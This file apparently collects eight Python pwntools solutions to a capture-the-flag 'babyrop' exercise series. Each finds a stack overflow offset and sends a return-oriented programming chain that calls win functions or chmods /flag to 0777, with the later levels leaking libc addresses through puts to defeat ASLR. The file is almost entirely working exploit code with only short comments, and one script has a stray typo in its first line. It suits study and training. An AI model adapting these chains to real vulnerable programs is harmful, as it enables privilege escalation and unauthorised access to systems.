#ROP1 - ho win
#!/usr/bin/python3
from pwn import *

# INITIALIZATION
# Load the ELF binary for analysis
elf = ELF('/challenge/babyrop_level1.0')

# CALCULATING BUFFER LENGTH
# Start a process to interact with the binary and determine the buffer length
io = elf.process(setuid=False)
io.sendline(cyclic(512, n=8))  # Send a cyclic pattern to cause a crash
io.wait()

# Find the offset at which the cyclic pattern overwrites the instruction pointer
buffer_length = cyclic_find(io.corefile.fault_addr, n=8)

# Exploit

# Start a new process to exploit the binary
io = elf.process()

# BUILD PAYLOAD
# Construct the payload to overflow the buffer and redirect control flow to win_stage_1 and win_stage_2
PAYLOAD = b'A' * buffer_length + p64(elf.symbols.win)

# SEND PAYLOAD
# Send the payload to the binary
io.sendline(PAYLOAD)
io.wait()
# PRINT EXPLOIT OUTPUT
# Print the output received after sending the payload
print(io.recvall().decode("utf-8","ignore"))


#ROP2 - 2 WIN
#!/usr/bin/python3
from pwn import *

# INITIALIZATION
# Load the ELF binary for analysis
elf = ELF('/challenge/babyrop_level2.1')

# CALCULATING BUFFER LENGTH
# Start a process to interact with the binary and determine the buffer length
io = elf.process(setuid=False)
io.sendline(cyclic(512, n=8))  # Send a cyclic pattern to cause a crash
io.wait()

# Find the offset at which the cyclic pattern overwrites the instruction pointer
buffer_length = cyclic_find(io.corefile.fault_addr, n=8)

# Exploit

# Start a new process to exploit the binary
io = elf.process()

# BUILD PAYLOAD
# Construct the payload to overflow the buffer and redirect control flow to win_stage_1 and win_stage_2
PAYLOAD = b'A' * buffer_length + p64(elf.symbols.win_stage_1) + p64(elf.symbols.win_stage_2)

# SEND PAYLOAD
# Send the payload to the binary
io.sendline(PAYLOAD)

# PRINT EXPLOIT OUTPUT
# Print the output received after sending the payload
print(io.recvall().decode())



#ROP3 - N WIN 
#!/usr/bin/python3
from pwn import *

# INITIALIZATION
elf = ELF('/challenge/babyrop_level3.1')
rop = ROP(elf)

# CALCULATING BUFFER LENGTH
# Start a process to interact with the binary and determine the buffer length
io = elf.process(setuid=False)
io.sendline(cyclic(512, n=8))  # Send a cyclic pattern to cause a crash
io.wait()

# Find the offset at which the cyclic pattern overwrites the instruction pointer
buffer_length = cyclic_find(io.corefile.fault_addr, n=8)

# Exploit

# Start a new process to exploit the binary
io = elf.process()

# ROP CHAIN CONSTRUCTION
# Build the ROP chain using the ROP object:
# Each line pops the correct parameter value into the RDI register and then call the function which uses that parameters
PAYLOAD = b'A' * buffer_length + \
    p64(rop.rdi.address) + p64(1) + p64(elf.symbols.win_stage_1) + \
    p64(rop.rdi.address) + p64(2) + p64(elf.symbols.win_stage_2) + \
    p64(rop.rdi.address) + p64(3) + p64(elf.symbols.win_stage_3) + \
    p64(rop.rdi.address) + p64(4) + p64(elf.symbols.win_stage_4) + \
    p64(rop.rdi.address) + p64(5) + p64(elf.symbols.win_stage_5)

# SEND PAYLOAD
# Send the payload to the binary
io.sendline(PAYLOAD)

# PRINT EXPLOIT OUTPUT
# Print the output received after sending the payload
print(io.recvall().decode())



#ROP4 - WITH BUFFADR
#!/usr/bin/python3
from pwn import *

# INITIALIZATION


# Load the ELF binary
elf = ELF('/challenge/babyrop_level4.0')
rop = ROP(elf)

## Calculating buffer length
# Create a process to determine the buffer length
io = elf.process(setuid=False)
io.sendline(cyclic(512, n=8))
io.wait()

# Find the offset where the cyclic pattern overwrites the return address
buffer_len = cyclic_find(io.corefile.fault_addr, n=8)

## Starting the exploit
# Create a new process for the exploit
io = elf.process()
io.recvuntil(b'located at: 0x')
buffer_addr = p64(int(io.recvuntil(b'.')[:-1], 16))

## Crafting ROP Chain

# ROP chain to set the file permissions of the buffer to 0777
CHAIN = (
    p64(rop.rax.address) + p64(0x5A) +  # Set rax to the syscall number for chmod (0x5A)
    p64(rop.rdi.address) + buffer_addr +  # Set rdi to the address of the buffer
    p64(rop.rsi.address) + p64(0o777) +  # Set rsi to the file permissions (0777)
    p64(rop.syscall.address)  # Make the syscall
)

# Construct the payload with the ROP chain
PAYLOAD = b'/flag\x00' + b'A' * (buffer_len - 6) + CHAIN

# Send the payload to the binary
io.sendline(PAYLOAD)

# Print the output received from the binary
print(io.recvall().decode('utf8','ignore'))


#ROP5 - LINK 
rfrom pwn import *

# INITIALIZATION
context.arch = 'amd64'
context.log_level = 'CRITICAL'

# Load the ELF binary
elf = ELF('/challenge/babyrop_level5.1')
rop = ROP(elf)

## Calculating buffer length
# Create a process to determine the buffer length
io = elf.process(setuid=False)
io.sendline(cyclic(512, n=8))
io.wait()

# Find the offset where the cyclic pattern overwrites the return address
buffer_len = cyclic_find(io.corefile.fault_addr, n=8)
print(buffer_len)
## Starting the exploit
# Create a new process for the exploit
io = elf.process()
## Crafting ROP Chain

# ROP chain to set the file permissions of the buffer to 0777
CHAIN = (
    p64(rop.rax.address) + p64(0x5A) +  # Set rax to the syscall number for chmod (0x5A)
    p64(rop.rdi.address) + p64(0x00402004) + ##p64(next()) # Set rdi to the address of the buffer
    p64(rop.rsi.address) + p64(0o777) +  # Set rsi to the file permissions (0777)
    p64(rop.syscall.address)  # Make the syscall
)

# Construct the payload with the ROP chain
PAYLOAD =  b'A' * (buffer_len ) + CHAIN

# Send the payload to the binary
io.sendline(PAYLOAD)

# Print the output received from the binary
print(io.recvall().decode('utf8','ignore'))

# ln --symbolic /flag "Leaving!"

#ROP6
#!/usr/bin/env python3
from pwn import *

# INIT

context.arch='amd64'
context.log_level='CRITICAL'
elf = ELF('/challenge/babyrop_level6.0')

# CALCULATING BUFFER LENGTH
io = elf.process(setuid=False)
io.sendline(cyclic(512,n=8))
io.wait()

buff_len = int(cyclic_find(io.corefile.fault_addr,n=8))

# EXPLOITING
io = elf.process()

libc = ELF(elf.libc.path)
rop = ROP(elf)

rop.puts(elf.got.puts)
rop.call('challenge')

#PUTS(puts)

PAYLOAD = b'A'*buff_len+\
    rop.chain()
io.sendline(PAYLOAD)
io.recvuntil(b'Leaving!\n')
function_address = u64(io.recvline()[:-1].ljust(8,b'\x00'))

print(hex(function_address))
print(hex(libc.symbols.puts))
libc_addr = function_address-libc.symbols.puts
print(hex(libc_addr))

libc.address=libc_addr

###

PAYLOAD = b'A'*buff_len+\
    p64(ROP(libc).find_gadget(['pop rdi', 'ret']).address)+\
    p64(next(elf.search(b'Leaving!')))+\
    p64(ROP(libc).find_gadget(['pop rax', 'ret']).address)+\
    p64(0x5A) +\
    p64(ROP(libc).find_gadget(['pop rsi', 'ret']).address) +\
    p64(0o777)+\
    p64(ROP(libc).find_gadget(['syscall']).address)

io.sendline(PAYLOAD)
io.interactive()



#ROP7
#!/usr/bin/env python3
from pwn import *

# INIT

# Set the architecture to amd64 for 64-bit binaries
context.arch = 'amd64'
# Set log level to CRITICAL to reduce output verbosity
context.log_level = 'CRITICAL'
# Load the ELF binary for analysis
elf = ELF('/challenge/babyrop_level7.0')

# CALCULATING BUFFER LENGTH
# Create a process to determine the length of the cyclic pattern needed to cause a crash
io = elf.process(setuid=False)
# Send a cyclic pattern of length 512 and wait for the process to crash
io.sendline(cyclic(512, n=8))
io.wait()

# Get the length of the cyclic pattern until the crash occurs
buff_len = int(cyclic_find(io.corefile.fault_addr, n=8))

# EXPLOITING
# Create a new process for the actual exploitation
io = elf.process()
# Receive the libc base address from the output
io.recvuntil(b'libc is: 0x')
system_addr = int(io.recvuntil(b'.').decode()[:-1], 16)

# Load the libc ELF for fur
libc = elf.libc
print(elf.libc)
# Calculate the offset of the 'system' function within libc
#system_offset = libc.symbols['system']
# Set the base address of libc
libc.address = system_addr - libc.symbols.system

# Define relevant offsets in libc from ROPGadget
SYSCALL = libc.address + 0x02284d
POP_RAX = libc.address + 0x036174
POP_RDI = libc.address + 0x023b6a
POP_RSI = libc.address + 0x02601f

# Construct the payload to call chmod
PAYLOAD = b'A' * buff_len + \
    p64(POP_RDI) + \
    p64(next(elf.search(b'Leaving!'))) + \
    p64(POP_RAX) + \
    p64(0x5A) + \
    p64(POP_RSI) + \
    p64(0o777) + \
    p64(SYSCALL)


# Send the payload to the process
io.sendline(PAYLOAD)
# Switch to interactive mode to flush stdout.
io.interactive()




#ROP8

#!/usr/bin/env python3
from pwn import *

# INIT

context.arch='amd64'
context.log_level='CRITICAL'
elf = ELF('/challenge/babyrop_level8.0')

# CALCULATING BUFFER LENGTH
io = elf.process(setuid=False)
io.sendline(cyclic(512,n=8))
io.wait()

buff_len = int(cyclic_find(io.corefile.fault_addr,n=8))

# EXPLOITING
io = elf.process()

libc = ELF(elf.libc.path)
rop = ROP(elf)

rop.puts(elf.got.puts)
rop.call('challenge')

#PUTS(puts)

PAYLOAD = b'A'*buff_len+\
    rop.chain()
io.sendline(PAYLOAD)
io.recvuntil(b'Leaving!\n')
function_address = u64(io.recvline()[:-1].ljust(8,b'\x00'))

print(hex(function_address))
print(hex(libc.symbols.puts))
libc_addr = function_address-libc.symbols.puts
print(hex(libc_addr))

libc.address=libc_addr

###


SYSCALL = libc.address + 0x02284d
POP_RAX = libc.address + 0x036174
POP_RDI = libc.address + 0x023b6a
POP_RSI = libc.address + 0x02601f

PAYLOAD = b'A'*buff_len+\
    p64(POP_RDI)+\
    p64(next(elf.search(b'Leaving!')))+\
    p64(POP_RAX)+\
    p64(0x5A) +\
    p64(POP_RSI) +\
    p64(0o777)+\
    p64(SYSCALL)

io.sendline(PAYLOAD)
io.interactive()



